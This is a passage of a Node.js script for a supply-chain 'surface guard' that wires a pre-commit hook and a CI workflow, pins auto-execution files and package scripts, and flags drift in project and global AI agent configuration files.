    return "pre-commit: appended guard to .husky/pre-commit";
  }
  if (existsSync(join(root, ".git"))) {
    const dir = join(root, ".git", "hooks");
    mkdirSync(dir, { recursive: true });
    const hook = join(dir, "pre-commit");
    const cur = existsSync(hook) ? readFileSync(hook, "utf-8") : "";
    if (cur.includes("guard-surfaces.mjs")) return "pre-commit: already wired (.git/hooks)";
    const body = cur.startsWith("#!") ? cur.replace(/\s*$/, "\n") + line + "\n" : `#!/bin/sh\n${cur}${line}\n`;
    writeFileSync(hook, body);
    try {
      chmodSync(hook, 0o755);
    } catch {
      /* perms ignored on Windows */
    }
    return "pre-commit: wrote .git/hooks/pre-commit";
  }
  return "pre-commit: no .husky or .git — add `node scripts/guard-surfaces.mjs` to your hook manually";
}

function ensureCiWorkflow(root) {
  if (!existsSync(join(root, ".github")))
    return "ci: no .github dir — add a job running the guard from a trusted ref";
  const file = join(root, ".github", "workflows", "surface-guard.yml");
  if (existsSync(file)) return "ci: .github/workflows/surface-guard.yml already exists (left as-is)";
  mkdirSync(dirname(file), { recursive: true });
  writeFileSync(file, CI_WORKFLOW);
  return "ci: wrote .github/workflows/surface-guard.yml";
}

export function runInit(root) {
  // Wire the hook + workflow FIRST, then pin LAST so --init's own additions are
  // included in the baseline (otherwise the first guard run fails on them).
  const pc = ensurePreCommit(root);
  const ci = ensureCiWorkflow(root);
  const pins = updatePins(root);
  console.log("✔ surface guard initialized:");
  console.log(`  - ${pc}`);
  console.log(`  - ${ci}`);
  console.log(`  - pinned ${Object.keys(pins.files).length} surface files + ${Object.keys(pins.packageScripts).length} package scripts → ${PINS_PATH}`);
  console.log("\nNext:");
  console.log("  1. commit security/surface-pins.json (+ the hook / workflow).");
  console.log("  2. add the 'surface-guard' CI check to your branch-protection required checks,");
  console.log("     and code-own security/ + scripts/ (see .github/CODEOWNERS).");
  console.log("  3. re-pin after any legit surface change: node scripts/guard-surfaces.mjs --update");
}

// ── cli ──

function runGlobalCli(args) {
  const home = homedir();
  const targets = loadConfig(process.cwd()).globalTargets;
  if (args.includes("--update")) {
    const snap = writeGlobalBaseline(home, targets);
    console.log(`✔ global baseline written for ${Object.keys(snap).length} agent config(s) → ~/${GLOBAL_BASELINE}`);
    return;
  }
  const res = runGlobalGuard(home, targets);
  if (res.needsBaseline) {
    console.log("No global baseline yet. Review your global agent configs, then run:\n  node scripts/guard-surfaces.mjs --global --update");
    return;
  }
  for (const n of res.notes) console.warn("  ! " + n);
  if (res.alerts.length) {
    console.error("\n✖ GLOBAL agent-config drift detected:\n");
    for (const a of res.alerts) console.error("  - " + a);
    console.error("\nIf you made these changes, re-baseline: node scripts/guard-surfaces.mjs --global --update\n");
    process.exit(1);
  }
  console.log("✔ global agent configs match the baseline");
}

function main() {
  const args = process.argv;
  if (args.includes("--init")) return runInit(process.cwd());
  if (args.includes("--global")) return runGlobalCli(args);
  const root = process.cwd();
  if (args.includes("--update")) {
    const pins = updatePins(root);
    console.log(`✔ re-pinned ${Object.keys(pins.files).length} surface files + ${Object.keys(pins.packageScripts).length} package scripts → ${PINS_PATH}`);
    return;
  }
  const { violations, warnings } = runGuard(root);
  for (const w of warnings) console.warn("  ! (advisory) " + w);
  if (violations.length) {
    console.error("\n✖ supply-chain surface guard FAILED:\n");
    for (const v of violations) console.error("  - " + v);
    console.error("\nIf a change is legitimate, re-pin in this PR: node scripts/guard-surfaces.mjs --update\n");
    process.exit(1);
  }
  console.log("✔ surface guard: all auto-execution surfaces match their pins");
}

const entry = process.argv[1] ? pathToFileURL(process.argv[1]).href : "";
if (import.meta.url === entry) main();
